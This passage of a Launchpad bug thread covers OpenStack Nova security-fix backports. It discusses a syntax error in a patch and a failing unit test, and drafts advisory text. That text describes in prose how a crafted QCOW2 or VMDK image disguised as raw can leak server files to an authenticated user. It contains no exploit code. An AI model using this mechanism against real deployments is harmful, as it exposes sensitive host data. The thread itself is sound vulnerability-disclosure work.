          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/32"> #32</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  <a href="https://bugs.launchpad.net/nova/+bug/2071734/comments/32/+download">Download full text</a> (3.7 KiB)
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Looks like backport patches all contains an error. Just right after &quot;def do_image_<wbr />deep_inspection<wbr />&quot; it adds an extra parenthesis:<br />
disk_format = img[&#x27;disk_format&#x27;])</p>
<p>which obviously, isn&#x27;t parseable. Once this is fixed, at least in Antelope (I haven&#x27;t checked other branches yet), I&#x27;m getting this:</p>
<p>=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<wbr />=======<br />
FAIL: nova.tests.<wbr />unit.virt.<wbr />test_images.<wbr />QemuTestCase.<wbr />test_fetch_<wbr />iso_is_<wbr />raw<br />
nova.tests.<wbr />unit.virt.<wbr />test_images.<wbr />QemuTestCase.<wbr />test_fetch_<wbr />iso_is_<wbr />raw<br />
-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<wbr />-------<br />
testtools.<wbr />testresult.<wbr />real._StringExc<wbr />eption: pythonlogging:&#x27;&#x27;: {{{<br />
2024-07-10 01:35:54,138 WARNING [oslo_policy.<wbr />policy] JSON formatted policy_file support is deprecated since Victoria release. You need to use YAML format which will be default in future. You can use ``oslopolicy-<wbr />convert-<wbr />json-to-<wbr />yaml`` tool to convert existing JSON-formatted policy file to YAML-formatted in backward compatible way: <a rel="nofollow" href="https://docs.openstack.org/oslo.policy/latest/cli/oslopolicy-convert-json-to-yaml.html">https:/<wbr />/docs.openstack<wbr />.org/oslo.<wbr />policy/<wbr />latest/<wbr />cli/oslopolicy-<wbr />convert-<wbr />json-to-<wbr />yaml.html</a>.<br />
2024-07-10 01:35:54,138 WARNING [oslo_policy.<wbr />policy] JSON formatted policy_file support is deprecated since Victoria release. You need to use YAML format which will be default in future. You can use ``oslopolicy-<wbr />convert-<wbr />json-to-<wbr />yaml`` tool to convert existing JSON-formatted policy file to YAML-formatted in backward compatible way: <a rel="nofollow" href="https://docs.openstack.org/oslo.policy/latest/cli/oslopolicy-convert-json-to-yaml.html">https:/<wbr />/docs.openstack<wbr />.org/oslo.<wbr />policy/<wbr />latest/<wbr />cli/oslopolicy-<wbr />convert-<wbr />json-to-<wbr />yaml.html</a>.<br />
2024-07-10 01:35:54,139 WARNING [oslo_policy.<wbr />policy] Policy Rules [&#x27;os_compute_<wbr />api:extensions&#x27;<wbr />, &#x27;os_compute_<wbr />api:os-<wbr />floating-<wbr />ip-pools&#x27;<wbr />, &#x27;os_compute_<wbr />api:os-<wbr />quota-sets:<wbr />defaults&#x27;<wbr />, &#x27;os_compute_<wbr />api:os-<wbr />availability-<wbr />zone:list&#x27;<wbr />, &#x27;os_compute_<wbr />api:limits&#x27;<wbr />, &#x27;project_<wbr />member_<wbr />api&#x27;, &#x27;project_<wbr />reader_<wbr />api&#x27;, &#x27;project_<wbr />member_<wbr />or_admin&#x27;<wbr />, &#x27;project_<wbr />reader_<wbr />or_admin&#x27;<wbr />, &#x27;os_compute_<wbr />api:limits:<wbr />other_project&#x27;<wbr />, &#x27;os_compute_<wbr />api:os-<wbr />lock-server:<wbr />unlock:<wbr />unlock_<wbr />override&#x27;<wbr />, &#x27;os_compute_<wbr />api:servers:<wbr />create:<wbr />zero_disk_<wbr />flavor&#x27;<wbr />, &#x27;compute:<wbr />servers:<wbr />resize:<wbr />cross_cell&#x27;<wbr />, &#x27;os_compute_<wbr />api:os-<wbr />shelve:<wbr />unshelve_<wbr />to_host&#x27;<wbr />] specified in policy files are the same as the defaults provided by the service. You can remove these rules from policy files which will make maintenance easier. You can detect these redundant rules by ``oslopolicy-<wbr />list-redundant`<wbr />` tool also.<br />
}}}</p>
<p>Traceback (most recent call last):<br />
&nbsp;&nbsp;File &quot;/&lt;&lt;PKGBUILDDIR<wbr />&gt;&gt;/nova/<wbr />virt/images.<wbr />py&quot;, line 158, in do_image_<wbr />deep_inspection<br />
&nbsp;&nbsp;&nbsp;&nbsp;inspector = format_<wbr />inspector.<wbr />detect_<wbr />file_format(<wbr />path)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^<br />
&nbsp;&nbsp;File &quot;/&lt;&lt;PKGBUILDDIR<wbr />&gt;&gt;/nova/<wbr />image/format_<wbr />inspector.<wbr />py&quot;, line 1014, in detect_file_format<br />
&nbsp;&nbsp;&nbsp;&nbsp;with open(filename, &#x27;rb&#x27;) as f:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^<br />
&nbsp;&nbsp;File &quot;/&lt;&lt;PKGBUILDDIR<wbr />&gt;&gt;/nova/<wbr />tests/fixtures/<wbr />nova.py&quot;<wbr />, line 1788, in toxic_wrapper<br />
&nbsp;&nbsp;&nbsp;&nbsp;return orig_f(*args, **kwargs)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^<br />
FileNotFoundError: [Errno 2] No such file or directory: &#x27;anypath.part&#x27;</p>
<p>During handling of the above exception, another exception occurred:</p>
<p>Traceback (most recent call last):<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3.<wbr />11/unittest/<wbr />mock.py&quot;<wbr />, line 1369, in patched<br />
&nbsp;&nbsp;&nbsp;&nbsp;return func(*newargs, **newkeywargs)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^<br />
&nbsp;&nbsp;File &quot;/&lt;&lt;PKGBUILDD...</p></div>
    
    <p>
      <a href="/nova/+bug/2071734/comments/32">Read more...</a>
    </p>
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Looks like backport patches all contains an error. Just right after "def do_image_deep_inspection" it adds an extra parenthesis:
disk_format = img['disk_format'])

which obviously, isn't parseable. Once this is fixed, at least in Antelope (I haven't checked other branches yet), I'm getting this:

======================================================================
FAIL: nova.tests.unit.virt.test_images.QemuTestCase.test_fetch_iso_is_raw
nova.tests.unit.virt.test_images.QemuTestCase.test_fetch_iso_is_raw
----------------------------------------------------------------------
testtools.testresult.real._StringException: pythonlogging:'': {{{
2024-07-10 01:35:54,138 WARNING [oslo_policy.policy] JSON formatted policy_file support is deprecated since Victoria release. You need to use YAML format which will be default in future. You can use ``oslopolicy-convert-json-to-yaml`` tool to convert existing JSON-formatted policy file to YAML-formatted in backward compatible way: https://docs.openstack.org/oslo.policy/latest/cli/oslopolicy-convert-json-to-yaml.html.
2024-07-10 01:35:54,138 WARNING [oslo_policy.policy] JSON formatted policy_file support is deprecated since Victoria release. You need to use YAML format which will be default in future. You can use ``oslopolicy-convert-json-to-yaml`` tool to convert existing JSON-formatted policy file to YAML-formatted in backward compatible way: https://docs.openstack.org/oslo.policy/latest/cli/oslopolicy-convert-json-to-yaml.html.
2024-07-10 01:35:54,139 WARNING [oslo_policy.policy] Policy Rules ['os_compute_api:extensions', 'os_compute_api:os-floating-ip-pools', 'os_compute_api:os-quota-sets:defaults', 'os_compute_api:os-availability-zone:list', 'os_compute_api:limits', 'project_member_api', 'project_reader_api', 'project_member_or_admin', 'project_reader_or_admin', 'os_compute_api:limits:other_project', 'os_compute_api:os-lock-server:unlock:unlock_override', 'os_compute_api:servers:create:zero_disk_flavor', 'compute:servers:resize:cross_cell', 'os_compute_api:os-shelve:unshelve_to_host'] specified in policy files are the same as the defaults provided by the service. You can remove these rules from policy files which will make maintenance easier. You can detect these redundant rules by ``oslopolicy-list-redundant`` tool also.
}}}

Traceback (most recent call last):
  File "/&lt;&lt;PKGBUILDDIR&gt;&gt;/nova/virt/images.py", line 158, in do_image_deep_inspection
    inspector = format_inspector.detect_file_format(path)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/&lt;&lt;PKGBUILDDIR&gt;&gt;/nova/image/format_inspector.py", line 1014, in detect_file_format
    with open(filename, 'rb') as f:
         ^^^^^^^^^^^^^^^^^^^^
  File "/&lt;&lt;PKGBUILDDIR&gt;&gt;/nova/tests/fixtures/nova.py", line 1788, in toxic_wrapper
    return orig_f(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: 'anypath.part'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3.11/unittest/mock.py", line 1369, in patched
    return func(*newargs, **newkeywargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/&lt;&lt;PKGBUILDDIR&gt;&gt;/nova/tests/unit/virt/test_images.py", line 261, in test_fetch_iso_is_raw
    images.fetch_to_raw(None, 'foo', 'anypath')
  File "/&lt;&lt;PKGBUILDDIR&gt;&gt;/nova/virt/images.py", line 198, in fetch_to_raw
    force_format = do_image_deep_inspection(img, image_href, path_tmp)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/&lt;&lt;PKGBUILDDIR&gt;&gt;/nova/virt/images.py", line 180, in do_image_deep_inspection
    raise exception.ImageUnacceptable(
nova.exception.ImageUnacceptable: Image foo is unacceptable: Image not in a supported format

what am I missing?
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/33" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~thomas-goirand" class="sprite person">Thomas Goirand (thomas-goirand)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-10T01:47:49.011804+00:00" title="2024-07-10 01:47:49 UTC">on 2024-07-10</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/33"> #33</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I just checked, and it really is the last backport patch that&#x27;s causing this (ie: &quot;Change force_format strategy to catch mismatches&quot;). Maybe because I&#x27;m missing hunks on other previous patches in the stack? I&#x27;ll be checking for this.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I just checked, and it really is the last backport patch that's causing this (ie: "Change force_format strategy to catch mismatches"). Maybe because I'm missing hunks on other previous patches in the stack? I'll be checking for this.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/34" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~thomas-goirand" class="sprite person">Thomas Goirand (thomas-goirand)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-10T02:04:17.296128+00:00" title="2024-07-10 02:04:17 UTC">on 2024-07-10</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/34"> #34</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I took the latest version, commited to Gerrit, of:<br />
- Check images with format_inspector for safety<br />
- Additional qemu safety checking on base images<br />
- Fix vmdk_allowed_types checking</p>
<p>Indeed, all of the 3 above were different from the one sent during the advisory.</p>
<p>But it didn&#x27;t help. I still have the above unit test failure.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I took the latest version, commited to Gerrit, of:
- Check images with format_inspector for safety
- Additional qemu safety checking on base images
- Fix vmdk_allowed_types checking

Indeed, all of the 3 above were different from the one sent during the advisory.

But it didn't help. I still have the above unit test failure.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/35" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-10T10:34:36.990860+00:00" title="2024-07-10 10:34:36 UTC">on 2024-07-10</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/35"> #35</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>ok, let me revalidate that the backports are created correctly and apply them cleanly.<br />
I&#x27;ll execute unit/functional tests to confirm via tox in a clean clone of Nova to make sure I do not see any effect from my normal dev environment.</p>
<p>if I reproduce the observed issue I&#x27;ll upload the patches and let you know which were changed.</p>
<p>its possible i did not save the file correctly before commit or something simple like that.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">ok, let me revalidate that the backports are created correctly and apply them cleanly.
I'll execute unit/functional tests to confirm via tox in a clean clone of Nova to make sure I do not see any effect from my normal dev environment.

if I reproduce the observed issue I'll upload the patches and let you know which were changed.

its possible i did not save the file correctly before commit or something simple like that.

</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/36" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-10T11:20:48.227005+00:00" title="2024-07-10 11:20:48 UTC">on 2024-07-10</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/36"> #36</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>there is indeed an extra close peren in the master.patch</p>
<p>the original patch was</p>
<p>+    ami_formats = (&#x27;ami&#x27;, &#x27;aki&#x27;, &#x27;ari&#x27;)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;disk_format = img[&#x27;disk_format&#x27;]<br />
the master.patch contains</p>
<p>-    disk_format = img[&#x27;disk_format&#x27;]<br />
+    ami_formats = (&#x27;ami&#x27;, &#x27;aki&#x27;, &#x27;ari&#x27;)<br />
+    disk_format = img[&#x27;disk_format&#x27;])</p>
<p>this was missed mainly because i was not reviewing the patches on gerrit after i created them and id didn&#x27;t notices that locally with diff</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">there is indeed an extra close peren in the master.patch

the original patch was 

+    ami_formats = ('ami', 'aki', 'ari')
     disk_format = img['disk_format']
the master.patch contains

-    disk_format = img['disk_format']
+    ami_formats = ('ami', 'aki', 'ari')
+    disk_format = img['disk_format'])

this was missed mainly because i was not reviewing the patches on gerrit after i created them and id didn't notices that locally with diff
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/37" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-10T13:34:28.527109+00:00" title="2024-07-10 13:34:28 UTC">on 2024-07-10</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/37"> #37</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Sean reminded me yesterday that this vulnerability is mitigated by keeping use_cow_images enabled, so the last sentence for the description in comment #29 should instead be, &quot;Only Nova deployments which disable use_cow_images are affected.&quot;</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Sean reminded me yesterday that this vulnerability is mitigated by keeping use_cow_images enabled, so the last sentence for the description in comment #29 should instead be, "Only Nova deployments which disable use_cow_images are affected."</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/38" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-10T13:46:35.454637+00:00" title="2024-07-10 13:46:35 UTC">on 2024-07-10</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/38"> #38</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>i have corrected the rebase artificat locally for master and the failing unit test.</p>
<p>the iso series adds one additional function call that was missing a mock in test_fetch_<wbr />iso_is_<wbr />raw.</p>
<p>i will upload a new revision of the branched patches in the next 30-60 mins once i have rerun the unit/functional tests on each branch.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">i have corrected the rebase artificat locally for master and the failing unit test.

the iso series adds one additional function call that was missing a mock in test_fetch_iso_is_raw.

i will upload a new revision of the branched patches in the next 30-60 mins once i have rerun the unit/functional tests on each branch.

</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/39" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-10T13:54:40.700078+00:00" title="2024-07-10 13:54:40 UTC">on 2024-07-10</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/39"> #39</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>After further discussion with Sean, it seems I misunderstood the two separate concerns addressed in this patch. Since only the incomplete fix for QCOW2 is mitigated by use_cow_images and the VMDK regression is reachable under all conditions, let&#x27;s go with this simpler description instead (for the errata publication we&#x27;ll separate the two cases as different comments):</p>
<p>Title: Incomplete file access fix and regression for QCOW2 backing files and VMDK flat descriptors<br />
Reporter: Arnaud Morin with OVH<br />
Products: Nova<br />
Affects: &lt;27.4.1, &gt;=28.0.0 &lt;28.2.1, &gt;=29.0.0 &lt;29.1.1</p>
<p>Description:<br />
Arnaud Morin (OVH) reported a vulnerability in Nova. By supplying a raw format image which is actually a specially crafted QCOW2 image with a backing file path or VMDK flat image with a descriptor file path, an authenticated user may convince systems to return a copy of the referenced file’s contents from the server resulting in unauthorized access to potentially sensitive data. All Nova deployments are affected.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">After further discussion with Sean, it seems I misunderstood the two separate concerns addressed in this patch. Since only the incomplete fix for QCOW2 is mitigated by use_cow_images and the VMDK regression is reachable under all conditions, let's go with this simpler description instead (for the errata publication we'll separate the two cases as different comments):

Title: Incomplete file access fix and regression for QCOW2 backing files and VMDK flat descriptors
Reporter: Arnaud Morin with OVH
Products: Nova
Affects: &lt;27.4.1, &gt;=28.0.0 &lt;28.2.1, &gt;=29.0.0 &lt;29.1.1

Description:
Arnaud Morin (OVH) reported a vulnerability in Nova. By supplying a raw format image which is actually a specially crafted QCOW2 image with a backing file path or VMDK flat image with a descriptor file path, an authenticated user may convince systems to return a copy of the referenced file’s contents from the server resulting in unauthorized access to potentially sensitive data. All Nova deployments are affected.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/40" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-10T15:04:34.134641+00:00" title="2024-07-10 15:04:34 UTC">on 2024-07-10</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/40"> #40</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a href="https://bugs.launchpad.net/nova/+bug/2071734/+attachment/5795886/+files/master.patch" class="sprite haspatch-icon">master.patch</a>
        <a class="sprite edit action-icon" href="/nova/+bug/2071734/+attachment/5795886">Edit</a>
        
        (23.1 KiB,
        text/plain)
        
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>generated with git format-patch --from HEAD^1 --output ~/cve-patches/<wbr />master.<wbr />patch<br />
after rebasing unforce-<wbr />format.<wbr />patch on the current head of master</p>
<p>commit a305571262481f7<wbr />fa0152ed23fffdc<wbr />c87fb821c9 (origin/master, origin/HEAD, gerrit/master, master)<br />
Merge: cc2514d02e ee3ec9b8f2<br />
Author: Zuul &lt;email address hidden&gt;<br />
Date:   Tue Jul 9 19:11:48 2024 +0000</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Merge &quot;[ironic] Ensure we test iterators when needed&quot;</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">generated with git format-patch --from HEAD^1 --output ~/cve-patches/master.patch
after rebasing unforce-format.patch on the current head of master

commit a305571262481f7fa0152ed23fffdcc87fb821c9 (origin/master, origin/HEAD, gerrit/master, master)
Merge: cc2514d02e ee3ec9b8f2
Author: Zuul &lt;zuul@review.opendev.org&gt;
Date:   Tue Jul 9 19:11:48 2024 +0000

    Merge "[ironic] Ensure we test iterators when needed"</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
